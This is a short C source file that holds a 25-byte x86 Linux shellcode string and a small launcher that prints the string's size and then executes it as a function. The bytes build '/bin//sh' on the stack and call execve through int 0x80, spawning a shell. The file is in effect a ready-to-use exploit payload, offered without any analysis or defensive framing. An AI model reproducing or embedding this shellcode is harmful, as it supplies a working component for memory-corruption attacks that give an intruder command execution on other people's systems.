/*
 * Author : superdk@hanmail.net
 * DATA : shellcode
 * LICENSE : GNU License
 */

#include <stdio.h>

char shellcode[] =
	"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

int main( )
{
	printf("Size: %d bytes\n",strlen(shellcode));
	(*(void (*)( )) shellcode)( );
}